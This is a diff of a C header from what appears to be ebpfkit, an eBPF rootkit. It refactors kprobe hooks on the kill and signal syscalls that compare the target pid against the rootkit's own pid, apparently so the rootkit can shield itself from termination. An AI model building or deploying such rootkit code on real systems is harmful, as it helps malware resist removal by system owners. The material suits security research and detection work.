@@ -8,15 +8,10 @@
 #ifndef _SIGNAL_H_
 #define _SIGNAL_H_
 
-__attribute__((always_inline)) int handle_signal(struct pt_regs *ctx)
+__attribute__((always_inline)) int handle_signal(struct pt_regs *ctx, int pid)
 {
     u64 ebpfkit_pid;
     LOAD_CONSTANT("ebpfkit_pid", ebpfkit_pid);
-
-    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
-
-    int pid;
-    bpf_probe_read(&pid, sizeof(pid), &PT_REGS_PARM1(rctx));
 
     if (pid == ebpfkit_pid)
     {
@@ -26,16 +21,14 @@ __attribute__((always_inline)) int handle_signal(struct pt_regs *ctx)
     return 0;
 }
 
-SEC("kprobe/__x64_sys_signal")
-int __x64_sys_signal(struct pt_regs *ctx)
+SYSCALL_KPROBE1(signal, int, pid)
 {
-    return handle_signal(ctx);
+    return handle_signal(ctx, pid);
 }
 
-SEC("kprobe/__x64_sys_kill")
-int __x64_sys_kill(struct pt_regs *ctx)
+SYSCALL_KPROBE1(kill, int, pid)
 {
-    return handle_signal(ctx);
+    return handle_signal(ctx, pid);
 }
 
 #endif
